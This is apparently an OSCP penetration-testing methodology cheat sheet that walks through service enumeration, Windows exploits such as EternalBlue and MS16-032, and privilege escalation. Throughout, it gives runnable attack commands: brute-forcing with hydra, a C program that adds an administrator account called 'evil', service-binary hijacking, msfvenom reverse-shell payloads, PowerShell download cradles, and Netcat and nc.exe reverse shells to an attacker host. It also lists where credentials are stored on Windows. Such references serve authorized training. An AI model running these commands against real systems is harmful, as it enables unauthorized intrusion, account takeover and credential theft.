# OSCP Penetration Testing Methodology

---

## Black-Box Enumeration

Black-box enumeration involves gathering information about a target system without prior knowledge of its configuration. The goal is to identify open ports, services, and potential vulnerabilities to inform subsequent exploitation attempts.

### Nmap Full TCP Port Scan
A comprehensive TCP port scan is the foundation of enumeration, providing insights into open ports, services, and operating system details.

**Command:**
```bash
nmap <ip> -sV -sC -O -T4 --traceroute -p- -oA ~/path/filename
```
- `-sV`: Detects service versions.
- `-sC`: Runs default Nmap scripts for additional enumeration.
- `-O`: Attempts OS detection.
- `-T4`: Sets aggressive timing for faster scans.
- `--traceroute`: Maps the network path to the target.
- `-p-`: Scans all 65,535 TCP ports.
- `-oA`: Saves output in all formats (normal, XML, grepable).

**Output Analysis:**
- Identify open ports and services (e.g., FTP, SSH, SMB, MSSQL, HTTP/HTTPS).
- Note service versions and OS details for targeted exploit research.

### FTP (Port 21)
FTP services are common entry points due to weak configurations or outdated software.

**Enumeration Steps:**
1. **Service Exploits**: Search for vulnerabilities using `searchsploit <service_version>` or Google.
2. **Banner Grabbing**: Check the FTP banner for version and configuration details.
3. **Default Credentials**: Test default credentials using `hydra`:
   ```bash
   hydra -L <userlist> -P <passlist> ftp://<ip>
   ```
4. **Anonymous Login**: Attempt anonymous access:
   ```bash
   ftp <ip>
   # Username: anonymous, Password: [empty or email]
   ```
5. **File Uploads**: If anonymous or authenticated access is granted, attempt to upload files. If a web service is present, check if FTP and web paths overlap (e.g., uploading a webshell to a web root).
6. **Nmap Scripts**: Run FTP-specific scripts:
   ```bash
   nmap -sV -sC --script=ftp-* <ip>
   ```

### SSH (Port 22)
SSH is a secure protocol but can be vulnerable to weak credentials or outdated software.

**Enumeration Steps:**
1. **Service Exploits**: Research exploits for the SSH version using `searchsploit <ssh_version>` or Google.
2. **Banner Grabbing**: Retrieve the SSH banner to identify the version.
3. **Default Credentials**: Test default credentials with `hydra`:
   ```bash
   hydra -L <userlist> -P <passlist> ssh://<ip>
   ```
4. **NSR Credentials**: Test credentials with `hydra` using the NSR (no strict requirement) option for specific usernames.
5. **Nmap Scripts**: Run SSH-specific scripts:
   ```bash
   nmap -sV -sC --script=ssh-* <ip>
   ```

### Samba (Ports 139, 445)
Samba provides file and print sharing services, often misconfigured on Windows or Linux systems.

**Enumeration Steps:**
1. **Nmap Scripts**:
   ```bash
   nmap -sV -sC --open -T4 -p 139,445 --script=vuln --script-args=unsafe=1 <ip>
   ```
   - Extracts OS, NetBIOS name, domain, workgroup, and vulnerabilities.
2. **Service Exploits**: Search for vulnerabilities using `searchsploit samba <version>` or Google.
3. **Enum4linux**:
   ```bash
   enum4linux -a <ip>
   ```
   - Enumerates users, shares, and domain information.
4. **SMBClient**:
   - List shares anonymously:
     ```bash
     smbclient -L <ip> -N
     ```
   - Connect to a specific share with credentials:
     ```bash
     smbclient \\\\<ip>\\<share> -U <username>
     ```

### MSSQL (Port 1433)
MSSQL databases may allow remote command execution or credential extraction.

**Enumeration Steps:**
1. **Connect with sqsh**:
   ```bash
   sqsh -S <ip> -U <username> -P <password>
   ```
2. **Enable xp_cmdshell** (for command execution):
   ```sql
   EXEC SP_CONFIGURE 'show advanced options', 1;
   RECONFIGURE;
   EXEC SP_CONFIGURE 'xp_cmdshell', 1;
   RECONFIGURE;
   ```
3. **Nmap Scripts**:
   ```bash
   nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=<pass>,ms-sql-xp-cmdshell.cmd="net user" <ip>
   ```
   - Tests for command execution vulnerabilities.
4. **Service Exploits**: Research MSSQL vulnerabilities using `searchsploit mssql <version>` or Google.

### HTTP/HTTPS (Ports 80, 443)
Web services are common attack vectors due to misconfigurations, outdated software, or exposed directories.

**Enumeration Steps:**
1. **Service Exploits**: Search for vulnerabilities using `searchsploit <web_server_version>` or Google.
2. **Nmap Scripts**:
   ```bash
   nmap -sV -sC --script=http-* <ip>
   ```
   - Identifies directories, methods (e.g., PUT), and vulnerabilities.
3. **Check HTTP Methods**:
   - If directories are found, test for the `PUT` method to upload files:
     ```bash
     curl -X OPTIONS http://<ip>/<directory>
     ```
4. **Nikto**:
   - Run a default scan:
     ```bash
     nikto -h http://<ip>
     ```
   - Scan for CGI directories:
     ```bash
     nikto -h http://<ip> -C all
     ```
5. **Source Code Analysis**: Inspect the web page source for hidden comments, credentials, or sensitive information.
6. **Gobuster Directory Enumeration**:
   - Using `common.txt`:
     ```bash
     gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e -t <threads> -o common.results
     ```
     ```bash
     gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e -t <threads> -x .php,.html,.txt -o exte.common.results
     ```
   - Using `big.txt`:
     ```bash
     gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/big.txt -s '200,204,301,302,307,403,500' -e -t <threads> -o big.results
     ```
     ```bash
     gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/big.txt -s '200,204,301,302,307,403,500' -e -t <threads> -x .php,.html,.txt -o exte.big.results
     ```
   - Using `directory-list-2.3-medium.txt`:
     ```bash
     gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,307,403,500' -e -t <threads> -o medium.results
     ```
     ```bash
     gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,307,403,500' -e -t <threads> -x .php,.html,.txt -o exte.medium.results
     ```
7. **Burp Suite**:
   - Use Spider to crawl the website.
   - Use Repeater to test for vulnerabilities (e.g., SQL injection, XSS).
8. **CeWL for Wordlists**:
   - Generate a custom wordlist from a website’s content:
     ```bash
     cewl -w custom_wordlist.txt http://<ip> -d <depth>
     ```

---

## Exploitation

This section details common Windows exploits used during penetration testing, including setup instructions, requirements, and execution steps.

### Windows Exploits

#### Churrasco
**Description**: Exploits token impersonation for privilege escalation on Windows Server 2003 and IIS 6.0.

**Steps**:
1. Download: `https://github.com/Re4son/Churrasco/raw/master/churrasco.exe`
2. Upload `churrasco.exe` to the target.
3. Set up a listener (e.g., Netcat: `nc -lvnp <port>`).
4. Execute:
   ```bash
   churrasco.exe -d "net user evil Ev!lpass /add && net localgroup administrators evil /add"
   ```

**Requirements**: Listener on the attacking machine.

#### MS08-067
**Description**: Exploits a vulnerability in the Server service, allowing remote code execution on Windows XP and Server 2003.

**Steps**:
1. Clone the exploit: `git clone https://github.com/andyacer/ms08_067.git`
2. Install dependencies: `pip install impacket`
3. Configure the exploit:
   - Identify the target OS and language.
   - Choose a reverse shell option (e.g., port 443 or default).
4. Set up a listener.
5. Run the exploit and select the appropriate menu option.

**Requirements**: Listener on the attacking machine.

#### MS17-010 (EternalBlue)
**Description**: Exploits SMBv1 vulnerabilities, affecting Windows XP to Server 2016.

**Steps**:
1. Clone the exploit: `git clone https://github.com/worawit/MS17-010.git`
2. For `zzz_exploit.py`:
   - Modify the script to include:
     ```python
     smb_send_file(smbConn, '/root/htb/blue/puckieshell443.exe', 'C', '/puckieshell443.exe')
     service_exec(conn, r'cmd /c c:\\puckieshell443.exe')
     ```
   - Generate a custom payload:
     ```bash
     msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f exe > shell.exe
     ```
   - Set up a listener.
   - Execute the exploit.
3. For `eternalblue_exploit7.py`:
   - Merge binaries and payload using: `https://github.com/nickvourd/eternalblue_win7_auto_gen`
   - Run:
     ```bash
     python MS17-010/eternalblue_exploit7.py <ip> /tmp/sc_x<arch>.bin
     ```
   - Set up a listener.

**Requirements**: Listener on the attacking machine.

#### MS10-059
**Description**: Exploits a privilege escalation vulnerability in Windows Task Scheduler.

**Steps**:
1. Download: `https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe`
2. Upload `MS10-059.exe` to the target.
3. Set up a listener.
4. Execute:
   ```bash
   MS10-059.exe <attacker_ip> <port>
   ```

**Requirements**: Listener on the attacking machine.

#### MS11-046
**Description**: Exploits a vulnerability in the Windows Ancillary Function Driver (AFD).

**Steps**:
1. Download: `https://www.exploit-db.com/exploits/40564`
2. Install MinGW: `apt install mingw-w64`
3. Compile:
   ```bash
   i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
   ```
4. Upload and execute `MS11-046.exe` on the target.

**Requirements**: None (no listener required).

#### MS15-051
**Description**: Exploits a kernel vulnerability in Windows, allowing privilege escalation.

**Steps**:
1. Download: `https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip`
2. Identify the target architecture (x86 or x64).
3. Upload the appropriate `ms15-051x<arch>.exe` and `nc.exe` to the target.
4. Set up a listener.
5. Execute:
   ```bash
   ms15-051x64.exe "nc.exe <attacker_ip> 4444 -e cmd.exe"
   ```

**Requirements**: Listener on the attacking machine.

#### MS16-032
**Description**: Exploits a privilege escalation vulnerability in the Windows Secondary Logon Service.

**Steps**:
1. Download: `https://www.exploit-db.com/exploits/39719`
2. Generate a reverse shell:
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=6666 -f exe > shell.exe
   ```
3. Modify the PowerShell script:
   - Replace `cmd.exe` with `shell.exe` in the script.
   - Add `Invoke-MS16-032` at the end of the script.
4. Upload `shell.exe` and the modified `ms16032.ps1` to the target.
5. Set up a listener.
6. Execute:
   ```bash
   C:\windows\sysnative\windowspowershell\v1.0\powershell IEX(New-Object Net.WebClient).downloadString('http://<attacker_ip>/ms16032.ps1')
   ```

**Requirements**: Listener on the attacking machine.

### Potato Exploits
Potato exploits leverage Windows token-handling vulnerabilities for privilege escalation.

#### Hot Potato
**Description**: Exploits NTLM relay and NBNS spoofing for privilege escalation on Windows 7, 8, 10, Server 2008, and Server 2012.

**Guide**: `https://foxglovesecurity.com/2016/01/16/hot-potato/`

**Use**: `https://github.com/foxglovesec/Potato`

#### Rotten Potato
**Description**: Exploits the BITS service and SeImpersonate/SeAssignPrimaryToken privileges on Windows 7, 8, 10, Server 2008, 2012, and 2016.

**Guides**:
- `https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/`
- `https://0xdf.gitlab.io/2018/08/04/htb-silo.html`

**Use**: `https://github.com/nickvourd/lonelypotato`
- **Note**: LonelyPotato provides an inline shell, unlike RottenPotato’s Meterpreter session.

#### Juicy Potato
**Description**: A weaponized RottenPotato variant exploiting token-handling vulnerabilities on Windows 7, 8, 10, Server 2008, 2012, and 2016.

**Affected Systems**:
- Windows 7 Enterprise
- Windows 8.1 Enterprise
- Windows 10 Enterprise/Professional
- Windows Server 2008 R2 Enterprise
- Windows Server 2012 Datacenter
- Windows Server 2016 Standard
- **Warning**: Does not work on Windows Server 2019.

**Guides**:
- `https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato`
- `https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato`

**Use**: `https://github.com/ohpe/juicy-potato`

**CLSID List**: `https://ohpe.it/juicy-potato/CLSID/`

---

## Privilege Escalation

Privilege escalation techniques aim to gain higher-level access (e.g., SYSTEM) on a compromised Windows system.

### Windows Privilege Escalation

#### System Information
Gather system details to identify exploitable vulnerabilities:
```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```
- Search for exploits: `searchsploit <os_version>` or Google.
- Additional details:
  ```bash
  systeminfo
  ```
  - Architecture, processor count, domain, hotfixes, system/input locale.
- Processor details:
  ```bash
  WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors
  ```

#### Windows Privileges
Check for exploitable privileges:
```bash
whoami /priv
```
- Key privileges to look for:
  - SeDebugPrivilege
  - SeRestorePrivilege
  - SeBackupPrivilege
  - SeTakeOwnershipPrivilege
  - SeTcbPrivilege
  - SeCreateTokenPrivilege
  - SeLoadDriverPrivilege
  - SeImpersonatePrivilege
  - SeAssignPrimaryTokenPrivilege
- Reference: `https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf`

#### User and Group Enumeration
List users and their groups:
```bash
net user
net user <username>
whoami /groups
```

#### Insecure File Permissions
Identify services with weak permissions:
```bash
tasklist /SVC > process.txt
# Or with PowerShell:
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```
Check file permissions:
```bash
icacls "<path>\<file.exe>"
```
- If the user has full access, replace the executable with a malicious one:
  ```c
  #include <stdlib.h>
  int main() {
      system("net user evil Ev!lpass /add");
      system("net localgroup administrators evil /add");
      return 0;
  }
  ```
  - Compile:
    ```bash
    i686-w64-mingw32-gcc adduser.c -o adduser.exe
    ```
  - Replace the service executable:
    ```bash
    move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"
    move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
    ```
  - Stop the service:
    ```bash
    net stop Serviio
    ```
  - Check service start mode:
    ```bash
    wmic service where caption="Serviio" get name, caption, state, startmode
    ```
  - If set to Auto, reboot the system (if SeShutdownPrivilege is available):
    ```bash
    shutdown /r /t 0
    ```

#### Unquoted Service Paths
Exploit services with unquoted paths containing spaces. Use tools like PowerUp (see below) to automate detection.

#### World-Writable Directories
Identify directories with weak permissions:
```bash
accesschk.exe -uws "Everyone" "C:\Program Files"
```

#### Installed Applications
List installed software versions:
```bash
wmic product get name, version, vendor
```

#### Scheduled Tasks
Enumerate scheduled tasks:
```bash
schtasks /query /fo LIST /v > schedule.txt
```

#### Windows Exploit Suggester
Identify missing patches:
```bash
python windows-exploit-suggester.py --database 2020-08-09-mssb.xls --systeminfo systeminfo.txt
```

#### Sherlock
Automate privilege escalation checks:
1. Append `Find-AllVulns` to `Sherlock.ps1`.
2. Execute:
   ```bash
   echo IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>:<port>/Sherlock.ps1') | powershell -noprofile -
   ```

#### Watson
Identify .NET vulnerabilities:
1. Check .NET version:
   ```bash
   dir %windir%\Microsoft.NET\Framework /AD
   ```
2. For pre-Windows 10 systems, use Watson v1: `https://github.com/rasta-mouse/Watson/tree/486ff207270e4f4cadc94ddebfce1121ae7b5437`
3. Build and execute the exploit in Visual Studio.

#### PowerUp
Automate privilege escalation checks:
1. Append `Invoke-AllChecks` to `PowerUp.ps1`.
2. Execute:
   ```bash
   echo IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>:<port>/PowerUp.ps1') | powershell -noprofile -
   ```

#### Stored Credentials
Check for stored credentials:
```bash
cmdkey /list
```
- If credentials exist, attempt `runas`:
  ```bash
  runas /savecred /user:<Domain>\<user> C:\<path>\<exefile>
  ```
- Search for plaintext or base64-encoded credentials in:
  - `C:\unattend.xml`
  - `C:\Windows\Panther\Unattend.xml`
  - `C:\Windows\Panther\Unattend\Unattend.xml`
  - `C:\Windows\system32\sysprep.inf`
  - `C:\Windows\system32\sysprep\sysprep.xml`
  - IIS `web.config`:
    - `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
    - `C:\inetpub\wwwroot\web.config`
  - Group Policy Preferences:
    - `C:\ProgramData\Microsoft\Group Policy\History\*\Machine\Preferences\Groups\Groups.xml`
    - `\\*\SYSVOL\*\Policies\*\MACHINE\Preferences\Groups\Groups.xml`
  - Other GPP files:
    - `Services\Services.xml`
    - `ScheduledTasks\ScheduledTasks.xml`
    - `Printers\Printers.xml`
    - `Drives\Drives.xml`
    - `DataSources\DataSources.xml`
  - McAfee SiteList:
    - `%AllUsersProfile%\Application Data\McAfee\Common Framework\SiteList.xml`

---

## Payload Generation with MSFvenom

Generate reverse shells for various platforms using `msfvenom`.

### Windows EXE
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe > shell.exe
```

### JSP
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f raw > shell.jsp
```

### ASP
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f asp > shell.asp
```

### ASPX
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f aspx > shell.aspx
```

### WAR
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f war > shell.war
```

---

## File Transfer

### PowerShell Download
Download files to the target:
```bash
powershell -command "& { iwr http://<attacker_ip>/file.txt -OutFile file.txt }"
```

---

## Reverse Shell with Netcat
Establish a reverse shell using Netcat:
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> > /tmp/f
```

---

## Plink for Port Forwarding
**Description**: Plink is a command-line tool similar to SSH, used for automated remote connections.

**Use Case**: Expose a remote port (e.g., Samba port 445) on the attacker’s machine.

**Steps**:
1. On the attacker’s machine, start SSH:
   ```bash
   systemctl start ssh
   ```
2. Upload `plink.exe` to the target in binary mode.
3. Execute on the target:
   ```bash
   plink.exe -l <username> -pw <password> -R <port>:127.0.0.1:<port> <attacker_ip>
   ```
4. The target’s port is now accessible on the attacker’s machine at `127.0.0.1:<port>`.
